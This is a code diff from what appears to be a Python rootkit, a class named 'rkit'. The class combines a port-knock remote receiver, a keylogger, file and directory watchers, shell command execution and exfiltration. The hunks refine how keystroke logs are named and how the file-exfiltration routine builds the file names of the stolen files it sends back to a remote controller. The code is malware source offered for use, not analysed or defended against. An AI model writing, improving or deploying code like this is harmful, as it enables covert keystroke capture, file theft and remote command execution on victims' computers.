@@ -18,9 +18,8 @@ def main():
 
 class rkit:
     def __init__(self):
-        name = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
         self.knocker = knock.remote_receiver(code, key, self)
-        self.keylogger = keylog(60, f".{name}.txt")
+        self.keylogger = keylog(60)
         self.file_watcher = f_watcher.file_watcher(self)
         self.dictionary_watcher = d_watcher.directory_watcher(self)
 
@@ -65,7 +64,6 @@ class rkit:
                 return 0
 
     def command_execute(self, command):
-        #out = subprocess.call(command, shell=True)
         out = subprocess.check_output(command, shell=True)
         self.knocker.exfiltrate(out, "/")
 
@@ -73,8 +71,10 @@ class rkit:
         try:
             f = open(file, "r+")
             data = f.read()
-            file_name = os.path.splitext(file)
-            file_name = file_name[0] + file_name[1]
+            if "/" in file:
+                file_name = file[file.rindex("/") + 1:]
+            else:
+                file_name = file
             self.knocker.exfiltrate(data, file_name)
         except FileNotFoundError:
             self.knocker.exfiltrate("File "+file+" not found", "/")
